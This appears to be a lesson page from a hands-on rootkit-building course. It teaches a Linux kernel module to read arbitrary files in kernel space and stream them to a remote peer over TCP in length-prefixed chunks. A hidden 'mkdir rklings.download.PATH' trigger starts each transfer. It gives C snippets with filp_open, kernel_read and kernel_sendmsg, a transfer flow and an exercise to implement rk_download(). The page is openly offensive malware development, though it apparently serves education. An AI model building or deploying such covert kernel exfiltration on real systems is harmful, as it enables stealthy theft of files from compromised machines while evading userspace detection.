# Read and exfiltrate a file

The rootkit can run commands and hold an interactive shell. The next step is
reading files directly from kernel space and streaming them to the peer over
a TCP socket, without spawning a userspace process.

`filp_open`, `kernel_read`, and `kernel_sendmsg` give the kernel everything
it needs to open, read, and transmit a file in chunks.

## Opening a file from kernel space

`filp_open(path, O_RDONLY, 0)` returns a `struct file *`. On failure it
returns an `ERR_PTR`, not NULL. Always check with `IS_ERR()` before using
the pointer:

```c
struct file *f = filp_open(path, O_RDONLY, 0);
if (IS_ERR(f))
    return PTR_ERR(f);
```

When done, close with `filp_close(f, NULL)`.

## Reading in chunks

`kernel_read(file, buf, count, &pos)` reads up to `count` bytes into a
kernel buffer starting at file offset `pos`. It advances `pos` automatically.
The return value is the number of bytes actually read, or a negative errno.
A return of 0 means end-of-file.

```text
pos = 0
    |
    v
kernel_read(file, buf, PAGE_SIZE, &pos)
    |
    +---> bytes_read > 0: send chunk, loop
    |
    +---> bytes_read == 0: EOF, send end marker
    |
    +---> bytes_read < 0: error, abort
```

Allocate one page-sized buffer with `kmalloc(PAGE_SIZE, GFP_KERNEL)` and
reuse it for every chunk. There is no reason to read more than one page at a
time: the socket send path will block if the TCP window is full.

## Sending chunks

Each chunk goes out with `kernel_sendmsg`. Build a `struct kvec` pointing at
the buffer, set its length to the number of bytes just read, and send:

```c
struct msghdr msg = { };
struct kvec vec = { .iov_base = buf, .iov_len = n };

sent = kernel_sendmsg(sock, &msg, &vec, 1, n);
```

Handle partial sends by looping until all bytes in the chunk are sent or an
error occurs.

## End-of-transfer marker

After the last chunk, the peer needs to know the file is complete. Send a
4-byte field containing zero (`__be32` network order, value 0) as the
end-of-transfer marker. The peer reads 4 bytes: if all are zero, the
transfer is done.

A simple protocol wraps each chunk:

```text
[4-byte length (big-endian)] [length bytes of data]
[4-byte length (big-endian)] [length bytes of data]
...
[4-byte zero]                                        <-- EOF
```

The length prefix tells the peer how many data bytes follow. A zero-length
prefix signals end-of-file.

## The download flow

```text
mkdir rklings.download./etc/hostname
        |
        v
  dispatcher extracts path: "/etc/hostname"
        |
        v
  sock_create_kern + kernel_connect to peer
        |
        v
  filp_open(path, O_RDONLY, 0)
        |
        v
  loop: kernel_read -> send length prefix -> kernel_sendmsg chunk
        |
        v
  send 4-byte zero (end marker)
        |
        v
  filp_close, kfree, sock_release
```

## Error handling

- `filp_open` failure: send an error response to the peer, then disconnect.
  The peer receives a negative length prefix (the errno as a signed 32-bit
  value) instead of file data.
- `kernel_read` failure mid-transfer: stop sending. The peer sees an
  incomplete transfer (no end marker), which it treats as an error.
- `kernel_sendmsg` failure: stop the loop. The socket is broken.

## Your task

Edit `main.c`. Implement `rk_download()` to open a file, stream its
contents in length-prefixed chunks, send the end marker, and clean up.
Wire it to the dispatcher so that `mkdir rklings.download.PATH` triggers
a file download.

Run:

```sh
./rklings check
```

## References

- Linux v7.2 file operations
  <https://github.com/torvalds/linux/blob/v7.2/fs/open.c>
- Linux v7.2 kernel_read
  <https://github.com/torvalds/linux/blob/v7.2/fs/read_write.c>
- Linux v7.2 kernel_sendmsg
  <https://github.com/torvalds/linux/blob/v7.2/net/socket.c>
